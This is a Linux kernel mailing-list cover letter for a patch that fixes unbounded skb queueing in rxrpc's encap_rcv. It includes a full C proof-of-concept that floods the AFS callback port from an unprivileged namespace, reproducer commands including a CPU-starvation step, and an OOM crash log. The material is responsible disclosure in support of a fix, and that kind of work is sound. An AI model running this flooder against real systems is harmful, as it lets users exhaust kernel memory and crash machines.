Received: from mail-pz2-f42.google.com (mail-pz2-f42.google.com [74.125.228.42])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 40AD34B95CA
	for <netdev@vger.kernel.org>; Thu, 17 Sep 2026 10:05:26 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.228.42
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1789639533; cv=none; b=ieki0ohLwf5xlsgZU1cAiZBvGGqfxxECHusvTx/LnRWKg3gA/7BOonC3X+jCPAw9HoHrf8wLp+NP4J5KRkZzhjVnzjPKCqFBuGVqMdQOvExh7yT/vwoKOieLik3xi7AMqxe89TAtv8bDzFm49bcfT5ougumaCOldhBcrIJ1DoG8=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1789639533; c=relaxed/simple;
	bh=u5HqxJfhmFegxw0wos4agpikeqqekmwIztsWcYyKnuU=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=p6vR9u3lMwRB69wGu1VfSnup6u794Yah26OMcO2dk/RuoIsI8A0l0RsvoHO5xR+Diwx+vP9Sij2w9Mx0DvuGSQe7mqzfEYKYV5w77X8rDGQMYpMvYWZuyjLJDQZAociXQIBKttJ2PPjz5+yk0MZUqvXpb7uGLrq/Wq8+P8x/DSw=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=qq2oPP72; arc=none smtp.client-ip=74.125.228.42
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="qq2oPP72"
Received: by mail-pz2-f42.google.com with SMTP id 41be03b00d2f7-cc4cacd3409so660603a12.2
        for <netdev@vger.kernel.org>; Thu, 17 Sep 2026 03:05:26 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1789639522; x=1790244322; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=W/szTIN79m7Dnoyc+f5JMqZzsvxW8I8wf6G76i3XSK8=;
        b=qq2oPP72x4e2wMUlN7DSh/lQ3Yj437gRtLFtedK4SU0RGLLydcFecS2+FBmewHsnmo
         qm9levQF39Q8ws7iVnBvOdwIaILi3WWMSPoMQ6NSbj1L//d6pujoInQeIII//W8vmC/j
         t1mFPWHeIOe9Kh4tP0mzmdBTKRJYjiNqSq34kj11+GBKqG2bu6Y0NQeyxcZKpuqky+71
         Hh1Jt28yyPB0gV1tPKEeNurDs3sOXTrspb8ZmzbR1LCFVGNsBzvvI/8c03SKokFmYTkK
         Z09keIb+2F+UzEuCnMHC3jIY0A2EmS5CAeagEPvd2kRxrm2+FFeeMAvlYerdAYEHlrvy
         vRlg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1789639522; x=1790244322;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=W/szTIN79m7Dnoyc+f5JMqZzsvxW8I8wf6G76i3XSK8=;
        b=RujkhoYBr3QVzeZ9wNcpshdkSBbj3FvOLN2mRPfiKWH2tgqEqjY0ABEjmAn5IwhvdW
         7KcQi0drM0r7BBM4w9NC7SpspJ26lsYtaVAd8M/idprWE4VYVvC1UJGYsa/2BUby6OXK
         ZX1XxE4GEFNGvcMOwmx5wOFFyOJWcBj522TrKwvX1PHur6f8ks6FmT5jZcaVNhcjHZYB
         a5DFfoKNyG0x0I16pxv1AW39l7nCXiubRUERYMEuqHQ9uZSrT2Z20djIzUag2nXfChaB
         /dMDgvgn9PG61hNg0frmfdrVXH41t0k9Ft407g41DWo9AoLWaDP4xuf4CugabcFX7MuP
         UZnA==
X-Forwarded-Encrypted: i=1; AKwUvByp+JU0ryt+SMYP6snr45PHnmPBLygOr+TohsilVR7CoCd0jwFJcQpv+ImpE1q6m3AIgu+y2Zg=@vger.kernel.org
X-Gm-Message-State: AFuF++lZZ5Vrmt7D04VR9KFrkifCV6cXN0/j9X5iT5jNSYazx6yAIflS
	ehcRcT2nMgzn3RFlmjOADL+NvRVIYbLO9ERGAiDcSsvXReTHQXLD5HRl0Pv9sf0Mz8Kr
X-Gm-Gg: AYBFou1ta3p6zQEVgRwHB0YfSwjfVuE1Z8qkpbAf/OrPPR6lPX4d5nFyVsgVmGUqnqA
	8bcgXlrTjI+KvVHRt93HVRT6ebIWqNPxr+QziyJ3RGdFw8YSYWt7GcP17OPexhg60VBQsklHIh0
	xLPIzNWGAubWlmmXw8WdjWS/Hslh9BwT1dmO0yW8ZMXSMvMQ7VAgLIscw+RhLVmCRkoKrCBxZ5i
	vBf2kGq8Aszbq5zyS15YMreWWU+laRQXMWN8QwRZgba/sAS7gYJU2KEbkA55b8PJWDR/WxsI2kc
	QKEBaMgzhTrAIk89xHeDiZ6h4jvlLu5Br2A/572aTATGGcB6+fykmCGhdmBXuPARs5cs1C47D27
	jI+2aXy3dOxgKH+5slcW63JtArfMaqeGUhl9CqlHC0ycuw4bQHKGMo9e205yq2sQ4x+qv2Gxrs5
	XSTyeJIXf1tsHpP626tenfdWPElfT4lFY/DaRFiBxaSiP4JSNXHjVTMlPfAQRzaMoiGEKuqZLtj
	e6jYRZaB0GfJ28JIs2tmoz06SNVuUMFtKUAugRN
X-Received: by 2002:a17:90b:5388:b0:38e:49c0:75a7 with SMTP id 98e67ed59e1d1-39e1e55f7c8mr14424663a91.8.1789639521418;
        Thu, 17 Sep 2026 03:05:21 -0700 (PDT)
Received: from b6ad5085b32f.. ([122.51.212.64])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-39e390c2984sm1019445a91.0.2026.09.17.03.05.17
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Thu, 17 Sep 2026 03:05:20 -0700 (PDT)
From: Zihan Xi <zihanx@nebusec.ai>
To: dhowells@redhat.com,
	marc.dionne@auristor.com,
	davem@davemloft.net,
	edumazet@google.com,
	kuba@kernel.org,
	pabeni@redhat.com
Cc: horms@kernel.org,
	linux-afs@lists.infradead.org,
	netdev@vger.kernel.org,
	linux-kernel@vger.kernel.org,
	zihanx@nebusec.ai
Subject: [PATCH net v6 0/1] rxrpc: fix encap_rcv skb accounting exhaustion
Date: Thu, 17 Sep 2026 10:05:08 +0000
Message-ID: <cover.1789608557.git.zihanx@nebusec.ai>
X-Mailer: git-send-email 2.47.3
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated an issue in net/rxrpc/io_thread.c and
net/rxrpc/local_object.c. The bug is reachable by a non-root user via
user and net namespaces. The panic below is a downstream OOM in the
sender's udpv6_sendmsg() path after privileged CPU pinning and a
SCHED_FIFO task starving krxrpcio, not an allocation in
rxrpc_encap_rcv() itself.
We've tested the patch. The rcvbuf cap bounds this flood and
should not affect other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

rxrpc_encap_rcv() queues encapsulated UDP packets on the RxRPC
local queue without UDP receive-buffer accounting. A local
AF_RXRPC service such as the AFS callback listener can then be
flooded with RxRPC-shaped UDP packets no longer limited by the
UDP socket rcvbuf.

After privileged CPU pinning and a SCHED_FIFO task starving
krxrpcio, the non-root flooder invoked the OOM killer from
udpv6_sendmsg() -> sock_alloc_send_pskb() -> __alloc_skb() /
kmalloc_reserve(). Unreclaimable slab was dominated by
skbuff_small_head (588666KB) and skbuff_head_cache (226372KB);
rxrpc_call_jar was only 611KB, so incoming-call setup was not
the main memory impact.

446b3e14525b is the first commit where encap_rcv() queued the skb
for later I/O-thread consumption instead of consuming it
immediately on the UDP receive path.

The patch reaccounts each encapsulated skb against the UDP socket
before queueing it and drops packets once sk_rcvbuf is exhausted.
The I/O thread orphans PACKET skbs on dequeue so UDP rmem
ownership does not follow them onto call or connection queues.
Error-queue skbs keep their destructor. skb_set_owner_r() does
not take sk_refcnt, so rxrpc_destroy_local() still clears
sk_user_data under RCU and delays sock_release() until the local
queues are purged.

sk_forward_alloc is serialised with sk->sk_receive_queue.lock.
encap_rcv() takes it around the charge; the I/O thread takes it
with spin_lock_bh() around skb_orphan(). Packets stay on the
RxRPC local queue.

The kernel UDP tunnel never sized sk_rcvbuf, so a cap at
sysctl_rmem_default (about 208KiB) would be smaller than one
advertised RxRPC receive window of ordinary DATA. The patch sets
sk_rcvbuf from rxrpc_rx_window_size * SKB_TRUESIZE(RXRPC_JUMBO(1)) * 2,
plus 25% for ACKs, extra calls and ICMP, capped by sysctl_rmem_max
without lowering the socket's existing sk_rcvbuf. sock_init_data()
already set sk_rcvbuf from sysctl_rmem_default, which is not
exported to rxrpc.ko. It is not sized from
rxrpc_rx_mtu (jumbo 46). The cap is refreshed under the receive-queue
lock when packets arrive, so a runtime increase of
rxrpc_rx_window_size applies to existing sockets; lowering the
window or rmem limit does not shrink them. DATA admission leaves fixed
rmem headroom for ICMP and error-queue skbs. Socket receive-buffer
drops increment UDP_MIB_RCVBUFERRORS and use
SKB_DROP_REASON_SOCKET_RCVBUFF.
Protocol memory-accounting failures increment UDP_MIB_MEMERRORS and use
SKB_DROP_REASON_PROTO_MEM. Both paths increment UDP_MIB_INERRORS.
skb->dev is cleared and the dst is dropped, matching the ordinary
UDP enqueue path.

packetdrill cannot express a sustained flood of unique incoming
RxRPC calls, so the dedicated sender below is used.

The in-kernel AFS client (CONFIG_AFS_FS) opens a callback manager
on UDP 7001 when a netns is created; that krxrpcio/7001 listener
is the flood target.
unshare -Urn is enough to get that listener. The sender uses ::1;
the PoC brings lo up because a fresh unshare netns leaves it
down. The recorded panic ran in a guest that already had
lo and ::1.

The crash log is ./scripts/decode_stacktrace.sh output against
the unfixed vmlinux from net/main a401a9d547c50 (7.3.0-rc1+,
CONFIG_AF_RXRPC=y, CONFIG_AFS_FS=y, CONFIG_KASAN=y).
Comm: poc_rxrpc_mem is the non-root flooder that hit OOM in
udpv6_sendmsg(), not in encap_rcv().

Reproducer:

Unprivileged flood:

    gcc -O2 -static -pthread -o poc_rxrpc_mem poc.c
    unshare -Urn ./poc_rxrpc_mem

That floods the local queue as a non-root user via user and net
namespaces. The crash log is not from that command.

Recorded panic (privileged scheduling interference, then
non-root flood):

    gcc -O2 -static -pthread -o poc_rxrpc_mem poc.c

    pid=
    for d in /proc/[0-9]*; do
        [ "$(cat $d/comm 2>/dev/null)" = "krxrpcio/7001" ] || continue
        pid=${d#/proc/}
    done
    taskset -p 2 "$pid"
    taskset -c 1 chrt -f 99 /bin/bash -c "while :; do :; done" &
    runuser -u test_user -- taskset -c 0 ./poc_rxrpc_mem -t 16 -s 90 -l 8

Compiling poc.c does not need privilege. The krxrpcio pinning and
SCHED_FIFO task require privilege. The flood ran as test_user (uid 1001).

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <net/if.h>
#include <netinet/in.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

#define RXRPC_PACKET_TYPE_DATA 1
#define RXRPC_CLIENT_INITIATED 0x01
#define RXRPC_SERVICE_ID 1
#define AFS_CB_CALLBACK_OP 204
#define DEFAULT_PORT 7001
#define DEFAULT_THREADS 4
#define DEFAULT_SECONDS 20
#define DEFAULT_PAYLOAD 8

struct __attribute__((packed)) rxrpc_wire_header {
	uint32_t epoch;
	uint32_t cid;
	uint32_t callNumber;
	uint32_t seq;
	uint32_t serial;
	uint8_t type;
	uint8_t flags;
	uint8_t userStatus;
	uint8_t securityIndex;
	uint16_t reserved;
	uint16_t serviceId;
};

struct thread_args {
	struct sockaddr_in6 dst;
	int seconds;
	size_t payload_len;
	uint32_t cid_seed;
	unsigned long sent;
};

static volatile sig_atomic_t stop_flag;

static void on_alarm(int sig)
{
	(void)sig;
	stop_flag = 1;
}

static void *sender_thread(void *arg)
{
	struct thread_args *ta = arg;
	int fd;
	char *packet;
	struct rxrpc_wire_header *hdr;
	uint32_t *op;
	uint32_t *count;
	uint32_t seq = 1;
	uint32_t cid = ta->cid_seed;

	fd = socket(AF_INET6, SOCK_DGRAM, 0);
	if (fd < 0) {
		perror("socket");
		return NULL;
	}

	packet = malloc(sizeof(*hdr) + ta->payload_len);
	if (!packet) {
		perror("malloc");
		close(fd);
		return NULL;
	}
	memset(packet + sizeof(*hdr), 0, ta->payload_len);
	hdr = (struct rxrpc_wire_header *)packet;
	hdr->callNumber = htonl(1);
	hdr->type = RXRPC_PACKET_TYPE_DATA;
	hdr->flags = RXRPC_CLIENT_INITIATED;
	hdr->userStatus = 0;
	hdr->securityIndex = 0;
	hdr->reserved = 0;
	hdr->serviceId = htons(RXRPC_SERVICE_ID);
	op = (uint32_t *)(packet + sizeof(*hdr));
	*op = htonl(AFS_CB_CALLBACK_OP);
	if (ta->payload_len >= 8) {
		count = op + 1;
		*count = htonl(1);
	}

	/*
	 * Each datagram is a new incoming RxRPC call (seq=1, unique cid).
	 * That makes the I/O thread do full incoming-call setup, so it
	 * falls behind encap_rcv and local->rx_queue can grow.
	 */
	while (!stop_flag) {
		hdr->epoch = htonl(0x80000000u | cid);
		hdr->cid = htonl(cid << 2);
		hdr->seq = htonl(1);
		hdr->serial = htonl(seq);
		if (sendto(fd, packet, sizeof(*hdr) + ta->payload_len, 0,
			   (struct sockaddr *)&ta->dst, sizeof(ta->dst)) >= 0) {
			ta->sent++;
			seq++;
			cid += 32;
		}
	}

	free(packet);
	close(fd);
	return NULL;
}

static int bring_up_lo(void)
{
	struct ifreq ifr;
	int fd;

	fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0)
		return -1;
	memset(&ifr, 0, sizeof(ifr));
	strcpy(ifr.ifr_name, "lo");
	if (ioctl(fd, SIOCGIFFLAGS, &ifr) < 0) {
		close(fd);
		return -1;
	}
	ifr.ifr_flags |= IFF_UP | IFF_RUNNING;
	if (ioctl(fd, SIOCSIFFLAGS, &ifr) < 0) {
		close(fd);
		return -1;
	}
	close(fd);
	return 0;
}

static void usage(const char *prog)
{
	fprintf(stderr, "Usage: %s [-a addr] [-p port] [-t threads] [-s seconds] [-l payload_len]\n", prog);
}

int main(int argc, char **argv)
{
	struct sockaddr_in6 dst = {
		.sin6_family = AF_INET6,
		.sin6_port = htons(DEFAULT_PORT),
	};
	const char *addr = "::1";
	int threads = DEFAULT_THREADS;
	int seconds = DEFAULT_SECONDS;
	size_t payload_len = DEFAULT_PAYLOAD;
	pthread_t *tids;
	struct thread_args *args;
	unsigned long total = 0;
	int opt;

	while ((opt = getopt(argc, argv, "a:p:t:s:l:h")) != -1) {
		switch (opt) {
		case 'a':
			addr = optarg;
			break;
		case 'p':
			dst.sin6_port = htons((uint16_t)strtoul(optarg, NULL, 0));
			break;
		case 't':
			threads = atoi(optarg);
			break;
		case 's':
			seconds = atoi(optarg);
			break;
		case 'l':
			payload_len = strtoul(optarg, NULL, 0);
			break;
		default:
			usage(argv[0]);
			return 1;
		}
	}

	if (threads <= 0 || seconds <= 0 || payload_len < 4 || payload_len > 65000) {
		usage(argv[0]);
		return 1;
	}
	if (inet_pton(AF_INET6, addr, &dst.sin6_addr) != 1) {
		perror("inet_pton");
		return 1;
	}
	if (bring_up_lo() < 0)
		perror("bring_up_lo");

	signal(SIGALRM, on_alarm);
	alarm(seconds);

	tids = calloc((size_t)threads, sizeof(*tids));
	args = calloc((size_t)threads, sizeof(*args));
	if (!tids || !args) {
		perror("calloc");
		return 1;
	}

	pthread_attr_t attr;
	if (pthread_attr_init(&attr) != 0) {
		perror("pthread_attr_init");
		return 1;
	}
	if (pthread_attr_setstacksize(&attr, 64 * 1024) != 0) {
		perror("pthread_attr_setstacksize");
		return 1;
	}

	for (int i = 0; i < threads; i++) {
		args[i].dst = dst;
		args[i].seconds = seconds;
		args[i].payload_len = payload_len;
		args[i].cid_seed = 1 + (uint32_t)i;
		if (pthread_create(&tids[i], &attr, sender_thread, &args[i]) != 0) {
			fprintf(stderr, "pthread_create(%d) failed: %s\n", i, strerror(errno));
			stop_flag = 1;
			threads = i;
			break;
		}
	}
	pthread_attr_destroy(&attr);

	for (int i = 0; i < threads; i++) {
		pthread_join(tids[i], NULL);
		total += args[i].sent;
	}

	printf("sent_packets=%lu payload_len=%zu threads=%d duration=%d\n",
	       total, payload_len, threads, seconds);
	free(args);
	free(tids);
	return 0;
}
------END poc.c--------

----BEGIN crash log----
[   57.790181][ T9986] poc_rxrpc_mem invoked oom-killer: gfp_mask=0xc2cc0(GFP_KERNEL|__GFP_NOWARN|__GFP_COMP|__GFP_NOMEMALLOC), order=0, oom_score_adj=0
[   57.830340][ T9986] CPU: 0 UID: 1001 PID: 9986 Comm: poc_rxrpc_mem Not tainted 7.3.0-rc1+ #2 PREEMPT(full)
[   57.830362][ T9986] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[   57.830368][ T9986] Call Trace:
[   57.830384][ T9986]  <TASK>
[   57.830389][ T9986]  dump_stack_lvl (lib/dump_stack.c:94 lib/dump_stack.c:120)
[   57.830520][ T9986]  dump_stack (lib/dump_stack.c:129)
[   57.830527][ T9986]  dump_header (mm/oom_kill.c:464)
[   57.830626][ T9986]  out_of_memory (mm/oom_kill.c:1075 mm/oom_kill.c:1143)
[   57.830638][ T9986]  ? __pfx_out_of_memory (mm/oom_kill.c:835)
[   57.830651][ T9986]  __alloc_frozen_pages_noprof (mm/page_alloc.c:4113 mm/page_alloc.c:5030 mm/page_alloc.c:5449)
[   57.830692][ T9986]  ? __pfx___alloc_frozen_pages_noprof (mm/page_alloc.c:4022)
[   57.830703][ T9986]  ? stack_trace_save (kernel/stacktrace.c:122)
[   57.830767][ T9986]  ? __pfx_stack_trace_save (kernel/stacktrace.c:397)
[   57.830776][ T9986]  ? stack_depot_save_flags (lib/stackdepot.c:667)
[   57.830846][ T9986]  ? __sanitizer_cov_trace_cmp4 (kernel/kcov.c:284)
[   57.830906][ T9986]  ? find_match (net/ipv6/route.c:806)
[   57.830996][ T9986]  ? kvm_clock_get_cycles (arch/x86/kernel/kvmclock.c:87)
[   57.831041][ T9986]  ? kasan_save_stack (mm/kasan/common.c:58)
[   57.831099][ T9986]  ? kasan_save_stack (mm/kasan/common.c:57)
[   57.831110][ T9986]  ? __lock_acquire (kernel/locking/lockdep.c:4690 kernel/locking/lockdep.c:5208)
[   57.831134][ T9986]  ? udpv6_sendmsg (net/ipv6/udp.c:1720)
[   57.831161][ T9986]  allocate_slab (mm/slub.c:3347 mm/slub.c:3470)
[   57.831176][ T9986]  new_slab (mm/slub.c:3513)
[   57.831184][ T9986]  refill_objects (mm/slub.c:7410)
[   57.831191][ T9986]  ? __pcs_replace_empty_main (include/linux/local_lock_internal.h:62 mm/slub.c:4762)
[   57.831212][ T9986]  __pcs_replace_empty_main (mm/slub.c:2885 mm/slub.c:4774)
[   57.831227][ T9986]  kmem_cache_alloc_node_noprof (mm/slub.c:4850 mm/slub.c:4984 mm/slub.c:5068)
[   57.831244][ T9986]  ? kmalloc_reserve (net/core/skbuff.c:615)
[   57.831301][ T9986]  kmalloc_reserve (net/core/skbuff.c:615)
[   57.831312][ T9986]  __alloc_skb (net/core/skbuff.c:715)
[   57.831323][ T9986]  ? __alloc_skb (include/linux/bottom_half.h:20 net/core/skbuff.c:697)
[   57.831335][ T9986]  ? __pfx___alloc_skb (include/linux/fortify-string.h:447)
[   57.831350][ T9986]  alloc_skb_with_frags (include/linux/skbuff.h:1384 net/core/skbuff.c:6796)
[   57.831359][ T9986]  ? __sanitizer_cov_trace_switch (kernel/kcov.c:347)
[   57.831370][ T9986]  sock_alloc_send_pskb (net/core/sock.c:3015)
[   57.831382][ T9986]  ? find_held_lock (kernel/locking/lockdep.c:5367)
[   57.831399][ T9986]  ? __this_cpu_preempt_check (lib/smp_processor_id.c:64)
[   57.831421][ T9986]  ? __pfx_sock_alloc_send_pskb (net/core/sock.c:2847)
[   57.831432][ T9986]  ? __lock_acquire (kernel/locking/lockdep.c:4690 kernel/locking/lockdep.c:5208)
[   57.831441][ T9986]  ? ipv6_dev_get_saddr (include/linux/rcupdate.h:882 net/ipv6/addrconf.c:1916)
[   57.831464][ T9986]  ? __lock_acquire (kernel/locking/lockdep.c:4690 kernel/locking/lockdep.c:5208)
[   57.831475][ T9986]  __ip6_append_data (include/net/sock.h:1907 net/ipv6/ip6_output.c:1695)
[   57.831487][ T9986]  ? find_held_lock (kernel/locking/lockdep.c:5367)
[   57.831499][ T9986]  ? __pfx_ip_generic_getfrag (include/linux/skbuff.h:3160)
[   57.831544][ T9986]  ? __pfx___ip6_append_data (net/ipv6/ip6_output.c:2063)
[   57.831553][ T9986]  ? ip6_mtu (net/ipv6/route.c:3290)
[   57.831571][ T9986]  ? ip6_setup_cork (net/ipv6/ip6_output.c:1450)
[   57.831583][ T9986]  ip6_make_skb (net/ipv6/ip6_output.c:2094)
[   57.831594][ T9986]  ? __pfx_ip_generic_getfrag (include/linux/skbuff.h:3160)
[   57.831607][ T9986]  ? __pfx_ip6_make_skb (net/ipv6/ip6_output.c:2040)
[   57.831650][ T9986]  ? __this_cpu_preempt_check (lib/smp_processor_id.c:64)
[   57.831664][ T9986]  udpv6_sendmsg (net/ipv6/udp.c:1720)
[   57.831676][ T9986]  ? udpv6_sendmsg (net/ipv6/udp.c:1720)
[   57.831688][ T9986]  ? find_held_lock (kernel/locking/lockdep.c:5367)
[   57.831704][ T9986]  ? __pfx_udpv6_sendmsg (net/ipv6/udp.c:338)
[   57.831716][ T9986]  ? __sanitizer_cov_trace_const_cmp4 (kernel/kcov.c:310)
[   57.831727][ T9986]  ? __pfx_avc_has_perm (include/linux/rcupdate.h:878)
[   57.831806][ T9986]  ? sock_has_perm (security/selinux/hooks.c:4932)
[   57.831838][ T9986]  ? __pfx_udpv6_sendmsg (net/ipv6/udp.c:338)
[   57.831854][ T9986]  inet6_sendmsg (net/ipv6/af_inet6.c:641)
[   57.831877][ T9986]  ? inet6_sendmsg (net/ipv6/af_inet6.c:641)
[   57.831895][ T9986]  __sys_sendto (net/socket.c:800 net/socket.c:815 net/socket.c:2281)
[   57.831912][ T9986]  ? __pfx___sys_sendto (net/socket.c:2235)
[   57.831926][ T9986]  ? rcu_is_watching (include/linux/context_tracking.h:128 kernel/rcu/tree.c:753)
[   57.831952][ T9986]  ? xfd_validate_state (arch/x86/kernel/fpu/xstate.c:1544)
[   57.831977][ T9986]  ? debug_smp_processor_id (lib/smp_processor_id.c:58)
[   57.831987][ T9986]  __x64_sys_sendto (net/socket.c:2288 net/socket.c:2284 net/socket.c:2284)
[   57.831998][ T9986]  ? __this_cpu_preempt_check (lib/smp_processor_id.c:64)
[   57.832006][ T9986]  ? lockdep_hardirqs_on (kernel/locking/lockdep.c:4488)
[   57.832024][ T9986]  x64_sys_call (arch/x86/include/generated/asm/syscalls_64.h:45)
[   57.832059][ T9986]  do_syscall_64 (arch/x86/entry/syscall_64.c:61 arch/x86/entry/syscall_64.c:84)
[   57.832072][ T9986]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
[   57.832094][ T9986] RIP: 0033:0x423004
[   57.832120][ T9986] Code: Unable to access opcode bytes at 0x422fda.

Code starting with the faulting instruction
===========================================
[   57.832135][ T9986] RSP: 002b:00007f4cf3c491b0 EFLAGS: 00000293 ORIG_RAX: 000000000000002c
[   57.832144][ T9986] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 0000000000423004
[   57.832150][ T9986] RDX: 0000000000000024 RSI: 00007f4cd8000b70 RDI: 0000000000000009
[   57.832155][ T9986] RBP: 00007f4cf3c491f0 R08: 00000000290bab20 R09: 000000000000001c
[   57.832160][ T9986] R10: 0000000000000000 R11: 0000000000000293 R12: 000000000000b99d
[   57.832165][ T9986] R13: 0000000080173387 R14: 00000000005cce1c R15: 00000000290bab20
[   57.832176][ T9986]  </TASK>
[   57.943752][ T9986] Mem-Info:
[   57.943785][ T9986] active_anon:7770 inactive_anon:1591 isolated_anon:0
[   57.943785][ T9986]  active_file:115 inactive_file:821 isolated_file:0
[   57.943785][ T9986]  unevictable:1768 dirty:0 writeback:0
[   57.943785][ T9986]  slab_reclaimable:7429 slab_unreclaimable:242615
[   57.943785][ T9986]  mapped:198 shmem:2716 pagetables:594
[   57.943785][ T9986]  sec_pagetables:0 bounce:0
[   57.943785][ T9986]  kernel_misc_reclaimable:0
[   57.943785][ T9986]  free:13782 free_pcp:329 free_cma:0
[   57.943833][ T9986] Node 0 active_anon:31080kB inactive_anon:6364kB active_file:460kB inactive_file:3284kB unevictable:7072kB isolated(anon):0kB isolated(file):0kB mapped:792kB dirty:0kB writeback:0kB shmem:10864kB shmem_thp:0kB shmem_pmdmapped:0kB anon_thp:0kB kernel_stack:9984kB pagetables:2376kB sec_pagetables:0kB all_unreclaimable? no Balloon:0kB gpu_active:0kB gpu_reclaim:0kB
[   57.943863][ T9986] Node 0 DMA free:5652kB boost:0kB min:524kB low:652kB high:780kB reserved_highatomic:0kB free_highatomic:0kB active_anon:0kB inactive_anon:36kB active_file:0kB inactive_file:0kB unevictable:0kB writepending:0kB zspages:0kB present:15992kB managed:15360kB mlocked:0kB bounce:0kB free_pcp:0kB local_pcp:0kB free_cma:0kB
[   57.943914][ T9986] lowmem_reserve[]: 0 1295 1295 1295 1295
[   57.943970][ T9986] Node 0 DMA32 free:49476kB boost:0kB min:44528kB low:55660kB high:66792kB reserved_highatomic:0kB free_highatomic:0kB active_anon:31044kB inactive_anon:6364kB active_file:460kB inactive_file:3284kB unevictable:7072kB writepending:0kB zspages:0kB present:2080640kB managed:1326208kB mlocked:0kB bounce:0kB free_pcp:1316kB local_pcp:664kB free_cma:0kB
[   57.944007][ T9986] lowmem_reserve[]: 0 0 0 0 0
[   57.944062][ T9986] Node 0 DMA: 5*4kB (UME) 4*8kB (UME) 4*16kB (UME) 3*32kB (UME) 1*64kB (E) 2*128kB (ME) 2*256kB (ME) 3*512kB (UME) 3*1024kB (UME) 0*2048kB 0*4096kB = 5652kB
[   57.944272][ T9986] Node 0 DMA32: 309*4kB (UME) 794*8kB (UME) 554*16kB (UME) 221*32kB (UME) 111*64kB (UME) 56*128kB (UME) 30*256kB (UME) 8*512kB (UM) 0*1024kB 0*2048kB 0*4096kB = 49572kB
[   57.944475][ T9986] Node 0 hugepages_total=0 hugepages_free=0 hugepages_surp=0 hugepages_size=1048576kB
[   57.944488][ T9986] Node 0 hugepages_total=4 hugepages_free=4 hugepages_surp=0 hugepages_size=2048kB
[   57.944501][ T9986] 3667 total pagecache pages
[   57.944526][ T9986] 0 pages in swap cache
[   57.944537][ T9986] Free swap  = 0kB
[   58.016931][ T9986] Total swap = 0kB
[   58.016963][ T9986] 524158 pages RAM
[   58.016972][ T9986] 0 pages HighMem/MovableOnly
[   58.016981][ T9986] 188766 pages reserved
[   58.016989][ T9986] 0 pages cma reserved
[   58.016998][ T9986] Unreclaimable slab info:
[   58.017007][ T9986] Name                      Used          Total
[   58.017026][ T9986] bio-464                   17KB         22KB
[   58.017038][ T9986] bio-528                   19KB         31KB
[   58.017050][ T9986] bio-544                   19KB         31KB
[   58.017061][ T9986] bio-552                   19KB         31KB
[   58.017076][ T9986] TIPC                      19KB         30KB
[   58.017089][ T9986] SCTPv6                    25KB         30KB
[   58.017116][ T9986] RXRPC                     46KB         64KB
[   58.017127][ T9986] rxrpc_call_jar           611KB        641KB
[   58.017140][ T9986] fib6_node                 15KB         16KB
[   58.017153][ T9986] ip6_dst_cache             15KB         18KB
[   58.017165][ T9986] RAWv6                     16KB         30KB
[   58.017176][ T9986] UDPv6                     72KB         94KB
[   58.017188][ T9986] TCPv6                     74KB         91KB
[   58.017207][ T9986] t10_alua_lu_gp_cache          8KB         11KB
[   58.017220][ T9986] scsi_sense_cache          15KB         16KB
[   58.017233][ T9986] virtio_scsi_cmd           21KB         24KB
[   58.017245][ T9986] bio-136                   41KB         44KB
[   58.017260][ T9986] bio-264                   10KB         15KB
[   58.017271][ T9986] mqueue_inode_cache         19KB         30KB
[   58.017300][ T9986] f2fs_evict_inode_work          7KB          7KB
[   58.017313][ T9986] bio-272                   10KB         15KB
[   58.017324][ T9986] f2fs_bio_post_read_ctx         30KB         31KB
[   58.017348][ T9986] jfs_mp                    14KB         15KB
[   58.017365][ T9986] cifs_small_rq             28KB         32KB
[   58.017378][ T9986] cifs_request              67KB         67KB
[   58.017389][ T9986] cifs_mpx_ids               8KB         11KB
[   58.017407][ T9986] cifs_io_subrequest         42KB         47KB
